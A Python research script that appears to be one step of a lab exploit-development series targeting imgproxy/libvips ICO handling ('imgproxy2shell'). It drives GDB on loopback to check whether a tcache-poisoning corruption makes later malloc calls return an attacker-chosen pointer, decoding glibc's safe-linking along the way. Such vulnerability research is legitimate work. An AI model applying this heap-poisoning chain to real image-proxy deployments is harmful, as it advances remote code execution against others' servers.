#!/usr/bin/env python3
"""W10: observe ten natural malloc(0x20) calls after the W8 wire-only poison.

Loopback only. Reuses the committed W9 probe verbatim, replacing only its GDB
command script. body[10:18] is set by the SIZE argument: 0x35 preserves the
victim chunk's original size field, avoiding the W9 free() abort. Every malloc
is natural; GDB writes no memory and forces no calls. Each return is printed
with an equality check against the wire-decoded tcache head.

Usage (lab paths are pinned in the W9 probe; run from anywhere):
    W8_OUTDIR=/tmp/out python3 ico_wire_head_consume.py TAG LOW N PRELOAD gdb SIZE BINARY
"""
import importlib.util
import sys

PROBE = ("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/"
         "provision/ico_post_poison_trace.py")

HEAD = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB_BASE %p ACTUAL %p\\n", $base, $dst
finish
printf "GDB_TCACHE_PRE head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
set $poisoned = 1
break free if $poisoned
commands
silent
if $rdi != 0
printf "GDB_FREE ptr=%p chunksize=%p ret=%p\\n", $rdi, *(unsigned long long*)($rdi-8), *(unsigned long long*)$rsp
end
continue
end
break malloc if $rdi == 0x20
continue
"""

TAIL = """quit
"""

body = ['printf "GDB_M1_HIT size=%p thread=%d\\n", $rdi, $_thread\n',
        'finish\n',
        'printf "GDB_M1_RET %p WIRE=%d\\n", $rax, (unsigned long)$rax == (unsigned long)$wire\n']
for i in range(2, 11):
    body.append('continue\n')
    body.append(f'printf "GDB_M{i}_HIT size=%p thread=%d\\n", $rdi, $_thread\n')
    body.append('finish\n')
    body.append(f'printf "GDB_M{i}_RET %p WIRE=%d\\n", $rax, '
                '(unsigned long)$rax == (unsigned long)$wire\n')
    body.append(f'set $h{i} = tcache->entries[1]\n')
    body.append(f'set $c{i} = tcache->counts[1]\n')
    body.append(f'printf "GDB_TCACHE_{i} head=%p count=%d\\n", $h{i}, $c{i}\n')
GDB = HEAD + "".join(body) + TAIL

spec = importlib.util.spec_from_file_location("w9probe", PROBE)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.GDB = GDB
sys.exit(mod.main())
